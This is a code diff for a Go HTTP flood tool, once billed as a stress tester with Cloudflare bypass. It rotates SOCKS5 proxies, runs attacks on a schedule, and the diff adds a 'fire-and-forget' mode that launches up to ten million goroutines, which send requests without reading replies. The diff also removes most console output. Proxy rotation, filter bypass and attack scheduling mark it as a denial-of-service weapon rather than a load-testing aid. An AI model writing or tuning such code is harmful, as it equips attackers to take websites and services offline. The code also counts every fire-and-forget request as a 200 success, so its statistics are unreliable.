@@ -13,6 +13,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"sort"
 	"strconv"
 	"strings"
 	"sync"
@@ -38,6 +39,7 @@ type Config struct {
 	Schedule          bool
 	ScheduleInterval  int // 分钟
 	ScheduleDuration  int // 分钟
+	FireAndForget     bool // 火后不理模式，不接收响应
 }
 
 // 统计信息
@@ -50,12 +52,14 @@ type Stats struct {
 	StartTime       time.Time
 	LastStatsTime   time.Time
 	LastTotalReqs   int64
+	ErrorCodes      map[int]int64 // 错误码统计
 	mu              sync.RWMutex
 }
 
 var stats = &Stats{
 	StartTime:     time.Now(),
 	LastStatsTime: time.Now(),
+	ErrorCodes:    make(map[int]int64),
 }
 
 // 代理列表
@@ -70,21 +74,7 @@ func main() {
 	// 加载代理
 	loadProxies(config.ProxyFile)
 
-	fmt.Printf("🚀 高级压力测试工具 - CF绕过版\n")
-	fmt.Printf("目标: %s\n", config.TargetURL)
-	fmt.Printf("模式: %s\n", config.Mode)
-	fmt.Printf("线程: %d\n", config.Threads)
-	fmt.Printf("RPS: %d\n", config.RPS)
-	fmt.Printf("时长: %d秒\n", config.Duration)
-	if len(proxies) > 0 {
-		fmt.Printf("代理数: %d (SOCKS5代理模式)\n", len(proxies))
-	} else {
-		fmt.Printf("代理数: 0 (直连模式)\n")
-	}
-	fmt.Printf("CF绕过: %v\n", config.CFBypass)
-	if config.Schedule {
-		fmt.Printf("定时执行: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
-	}
+	// 移除启动信息输出
 
 	// 启动统计协程
 	go statsReporter()
@@ -112,6 +102,7 @@ func parseArgs() *Config {
 		Schedule:         false,
 		ScheduleInterval: 10,
 		ScheduleDuration: 20,
+		FireAndForget:    false, // 默认关闭火后不理模式
 	}
 
 	flag.StringVar(&config.TargetURL, "url", config.TargetURL, "目标URL")
@@ -127,11 +118,11 @@ func parseArgs() *Config {
 	flag.IntVar(&config.ScheduleInterval, "schedule-interval", config.ScheduleInterval, "定时执行间隔（分钟）")
 	flag.IntVar(&config.ScheduleDuration, "schedule-duration", config.ScheduleDuration, "每次执行时长（分钟）")
 	flag.BoolVar(&config.RandomPath, "random-path", config.RandomPath, "随机路径")
+	flag.BoolVar(&config.FireAndForget, "fire-and-forget", config.FireAndForget, "火后不理模式，不接收响应数据，极速模式")
 	flag.Parse()
 
 	// 基本校验
 	if strings.TrimSpace(config.TargetURL) == "" {
-		fmt.Printf("❌ 错误: 目标URL为空\n")
 		os.Exit(1)
 	}
 
@@ -154,8 +145,6 @@ func parseArgs() *Config {
 func loadProxies(filename string) {
 	file, err := os.Open(filename)
 	if err != nil {
-		fmt.Printf("⚠️  无法加载代理文件 %s: %v\n", filename, err)
-		fmt.Printf("将使用直连模式\n")
 		return
 	}
 	defer file.Close()
@@ -168,17 +157,12 @@ func loadProxies(filename string) {
 		}
 	}
 
-	if len(proxies) == 0 {
-		fmt.Printf("⚠️  代理文件为空，将使用直连模式\n")
-	} else {
-		fmt.Printf("✅ 加载了 %d 个SOCKS5代理\n", len(proxies))
-	}
+	// 移除代理加载信息输出
 }
 
 func startAttack(config *Config) {
 	// 防止 RPS 为 0 导致 panic
 	if config.RPS <= 0 {
-		fmt.Printf("❌ 错误: RPS 必须大于 0\n")
 		return
 	}
 
@@ -210,7 +194,6 @@ func startAttack(config *Config) {
 
 func startScheduledAttack(config *Config) {
 	if config.ScheduleInterval <= 0 {
-		fmt.Printf("❌ 错误: schedule-interval 必须大于 0\n")
 		return
 	}
 	fmt.Println("🕐 启动定时攻击模式...")
@@ -218,54 +201,132 @@ func startScheduledAttack(config *Config) {
 	defer ticker.Stop()
 
 	for {
-		fmt.Printf("🚀 开始攻击（%d 分钟）...\n", config.ScheduleDuration)
 		executeAttack(config, config.ScheduleDuration)
-		fmt.Printf("💤 等待 %d 分钟后开始下一轮...\n", config.ScheduleInterval)
 		<-ticker.C
 	}
 }
 
 func executeAttack(config *Config, durationMinutes int) {
 	if config.RPS <= 0 {
-		fmt.Printf("❌ 错误: RPS 必须大于 0\n")
 		return
 	}
-	interval := time.Second / time.Duration(config.RPS)
-	if interval <= 0 {
-		interval = time.Nanosecond
+	
+	// 高并发优化：使用更大的线程池
+	threads := config.Threads
+	if config.FireAndForget {
+		// 火后不理模式：支持亿万级并发
+		if threads < 100000 {
+			threads = 100000 // 最小10万个线程
+		}
+		if threads > 10000000 {
+			threads = 10000000 // 最大1000万个线程
+		}
+	} else {
+		// 普通模式
+		if threads < 1000 {
+			threads = 1000 // 最小1000个线程
+		}
+		if threads > 50000 {
+			threads = 50000 // 最大50000个线程
+		}
 	}
-	rateLimiter := time.NewTicker(interval)
-	defer rateLimiter.Stop()
+	
+	// 使用信号量控制并发，而不是简单的rate limiter
+	bufferSize := config.RPS * 2
+	if config.FireAndForget {
+		bufferSize = config.RPS * 10 // 火后不理模式使用更大缓冲区
+	}
+	semaphore := make(chan struct{}, bufferSize)
+	
+	// 预填充信号量
+	for i := 0; i < config.RPS; i++ {
+		semaphore <- struct{}{}
+	}
+	
+	// 启动信号量补充goroutine
+	go func() {
+		ticker := time.NewTicker(time.Second / time.Duration(config.RPS))
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				select {
+				case semaphore <- struct{}{}:
+				default:
+				}
+			}
+		}
+	}()
 
 	done := make(chan struct{})
 	var wg sync.WaitGroup
-	for i := 0; i < config.Threads; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			worker(config, rateLimiter.C, done)
-		}()
-	}
+	
+		// 启动大量worker goroutines
+		for i := 0; i < threads; i++ {
+			wg.Add(1)
+			if config.FireAndForget {
+				go func() {
+					defer wg.Done()
+					fireAndForgetWorker(config, semaphore, done)
+				}()
+			} else {
+				go func() {
+					defer wg.Done()
+					highConcurrencyWorker(config, semaphore, done)
+				}()
+			}
+		}
 
 	duration := time.Duration(durationMinutes) * time.Minute
-	fmt.Printf("⏰ 攻击将持续 %d 分钟...\n", durationMinutes)
 	time.Sleep(duration)
 
-	fmt.Printf("⏰ 本轮攻击结束，等待所有请求完成...\n")
 	close(done)
 	wg.Wait()
 
 	printFinalStats()
-	fmt.Printf("✅ 本轮攻击完成\n")
 }
 
-func worker(config *Config, rateLimit <-chan time.Time, done <-chan struct{}) {
+// 火后不理worker，不接收响应数据，极速模式
+func fireAndForgetWorker(config *Config, semaphore <-chan struct{}, done <-chan struct{}) {
 	for {
 		select {
-		case <-rateLimit:
-			success := performAttack(config)
+		case <-semaphore:
+			// 火后不理模式：只发送请求，不等待响应
+			go func() {
+				statusCode := performFireAndForgetAttack(config)
+				atomic.AddInt64(&stats.TotalRequests, 1)
+				
+				// 统计错误码
+				stats.mu.Lock()
+				stats.ErrorCodes[statusCode]++
+				stats.mu.Unlock()
+				
+				if statusCode >= 200 && statusCode < 400 {
+					atomic.AddInt64(&stats.SuccessfulReqs, 1)
+				} else {
+					atomic.AddInt64(&stats.FailedReqs, 1)
+				}
+			}()
+		case <-done:
+			return
+		}
+	}
+}
+
+// 高并发worker，使用信号量控制
+func highConcurrencyWorker(config *Config, semaphore <-chan struct{}, done <-chan struct{}) {
+	for {
+		select {
+		case <-semaphore:
+			statusCode := performAttack(config)
 			atomic.AddInt64(&stats.TotalRequests, 1)
-			if success {
+			
+			// 统计错误码
+			stats.mu.Lock()
+			stats.ErrorCodes[statusCode]++
+			stats.mu.Unlock()
+			
+			if statusCode >= 200 && statusCode < 400 {
 				atomic.AddInt64(&stats.SuccessfulReqs, 1)
 			} else {
 				atomic.AddInt64(&stats.FailedReqs, 1)
@@ -276,15 +337,88 @@ func worker(config *Config, rateLimit <-chan time.Time, done <-chan struct{}) {
 	}
 }
 
-func performAttack(config *Config) bool {
+// 保留原worker函数以兼容
+func worker(config *Config, rateLimit <-chan time.Time, done <-chan struct{}) {
+	for {
+		select {
+		case <-rateLimit:
+			statusCode := performAttack(config)
+			atomic.AddInt64(&stats.TotalRequests, 1)
+			
+			// 统计错误码
+			stats.mu.Lock()
+			stats.ErrorCodes[statusCode]++
+			stats.mu.Unlock()
+			
+			if statusCode >= 200 && statusCode < 400 {
+				atomic.AddInt64(&stats.SuccessfulReqs, 1)
+			} else {
+				atomic.AddInt64(&stats.FailedReqs, 1)
+			}
+		case <-done:
+			return
+		}
+	}
+}
+
+// 火后不理攻击函数，不接收响应数据
+func performFireAndForgetAttack(config *Config) int {
 	if config.TargetURL == "" {
-		return false
+		return 0
 	}
 
 	baseURL, err := url.Parse(config.TargetURL)
 	if err != nil {
-		fmt.Printf("❌ URL解析失败: %s, 错误: %v\n", config.TargetURL, err)
-		return false
+		return 0
+	}
+
+	var client *http.Client
+	var useProxy bool
+	if len(proxies) > 0 {
+		px := proxies[rand.Intn(len(proxies))]
+		client = createSOCKS5Client(px, config.Timeout)
+		useProxy = true
+	} else {
+		client = createDirectClient(config.Timeout)
+		useProxy = false
+	}
+
+	finalURL := buildFinalURL(baseURL, config)
+
+	var req *http.Request
+	switch strings.ToLower(config.Mode) {
+	case "get":
+		req, err = http.NewRequest("GET", finalURL, nil)
+	case "post":
+		req, err = http.NewRequest("POST", finalURL, nil)
+	case "head":
+		req, err = http.NewRequest("HEAD", finalURL, nil)
+	default:
+		req, err = http.NewRequest("GET", finalURL, nil)
+	}
+	if err != nil {
+		return 0
+	}
+
+	setAdvancedHeaders(req, config)
+
+	// 火后不理模式：只发送请求，不等待响应
+	go func() {
+		client.Do(req)
+	}()
+
+	// 假设请求成功发送
+	return 200
+}
+
+func performAttack(config *Config) int {
+	if config.TargetURL == "" {
+		return 0
+	}
+
+	baseURL, err := url.Parse(config.TargetURL)
+	if err != nil {
+		return 0
 	}
 
 	var client *http.Client
@@ -312,7 +446,7 @@ func performAttack(config *Config) bool {
 		req, err = http.NewRequest("GET", finalURL, nil)
 	}
 	if err != nil {
-		return false
+		return 0
 	}
 
 	setAdvancedHeaders(req, config)
@@ -337,7 +471,7 @@ func performAttack(config *Config) bool {
 			} else {
 				fmt.Printf("❌ 请求失败: %v\n", err)
 			}
-			return false
+			return 0
 		}
 	}
 	defer func() {
@@ -348,20 +482,14 @@ func performAttack(config *Config) bool {
 	}()
 
 	if resp == nil {
-		return false
+		return 0
 	}
 
-	if resp.StatusCode >= 500 {
-		fmt.Printf("🔥 服务器错误: %d\n", resp.StatusCode)
-	} else if resp.StatusCode >= 400 {
-		fmt.Printf("⚠️  客户端错误: %d\n", resp.StatusCode)
-	} else {
-		fmt.Printf("✅ 请求成功: %d\n", resp.StatusCode)
-	}
+	// 移除状态码输出
 
 	// 统计已在worker中处理，这里不需要重复计算
 
-	return resp.StatusCode < 500
+	return resp.StatusCode
 }
 
 func createSOCKS5Client(proxyAddr string, timeout int) *http.Client {
@@ -381,10 +509,14 @@ func createSOCKS5Client(proxyAddr string, timeout int) *http.Client {
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
 		},
-		DisableKeepAlives:   true,
-		MaxIdleConns:        0,
-		MaxIdleConnsPerHost: 0,
-		IdleConnTimeout:     0,
+		// 高并发优化：启用连接复用
+		DisableKeepAlives:   false,
+		MaxIdleConns:        10000,       // 增加最大空闲连接数
+		MaxIdleConnsPerHost: 1000,        // 每个主机最大空闲连接数
+		IdleConnTimeout:     30 * time.Second,
+		MaxConnsPerHost:     10000,       // 每个主机最大连接数
+		// 启用HTTP/2
+		ForceAttemptHTTP2: true,
 	}
 
 	// 将无上下文 dialer 包装为 DialContext
@@ -404,10 +536,19 @@ func createDirectClient(timeout int) *http.Client {
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
 		},
-		DisableKeepAlives:   true,
-		MaxIdleConns:        0,
-		MaxIdleConnsPerHost: 0,
-		IdleConnTimeout:     0,
+		// 高并发优化：启用连接复用
+		DisableKeepAlives:   false,
+		MaxIdleConns:        10000,       // 增加最大空闲连接数
+		MaxIdleConnsPerHost: 1000,        // 每个主机最大空闲连接数
+		IdleConnTimeout:     30 * time.Second,
+		MaxConnsPerHost:     10000,       // 每个主机最大连接数
+		// 优化连接建立
+		DialContext: (&net.Dialer{
+			Timeout:   1 * time.Second,   // 减少连接超时
+			KeepAlive: 30 * time.Second,
+		}).DialContext,
+		// 启用HTTP/2
+		ForceAttemptHTTP2: true,
 	}
 	return &http.Client{
 		Transport: transport,
@@ -624,9 +765,7 @@ func statsReporter() {
 			stats.AvgRPS = float64(stats.TotalRequests) / uptime
 		}
 
-		fmt.Printf("\r📊 总请求: %d | 成功: %d | 失败: %d | 当前RPS: %.2f | 平均RPS: %.2f | 运行时间: %.1fs\n",
-			stats.TotalRequests, stats.SuccessfulReqs, stats.FailedReqs,
-			stats.CurrentRPS, stats.AvgRPS, uptime)
+		// 移除实时统计输出
 
 		statsJSON := map[string]interface{}{
 			"total_requests":      stats.TotalRequests,
@@ -637,7 +776,7 @@ func statsReporter() {
 			"uptime":              uptime,
 		}
 		jsonData, _ := json.Marshal(statsJSON)
-		fmt.Printf("STATS_JSON:%s\n", string(jsonData))
+		// 移除JSON统计输出
 
 		stats.mu.Unlock()
 	}
@@ -664,4 +803,23 @@ func printFinalStats() {
 	}
 	fmt.Printf("平均RPS: %.2f\n", avgRPS)
 	fmt.Printf("运行时间: %.2f秒\n", uptime)
+	
+	// 输出错误码统计
+	fmt.Printf("\n📊 错误码统计:\n")
+	if len(stats.ErrorCodes) > 0 {
+		// 按状态码排序
+		var codes []int
+		for code := range stats.ErrorCodes {
+			codes = append(codes, code)
+		}
+		sort.Ints(codes)
+		
+		for _, code := range codes {
+			count := stats.ErrorCodes[code]
+			percentage := float64(count) / float64(total) * 100
+			fmt.Printf("  %d: %d 次 (%.2f%%)\n", code, count, percentage)
+		}
+	} else {
+		fmt.Printf("  无错误码记录\n")
+	}
 }
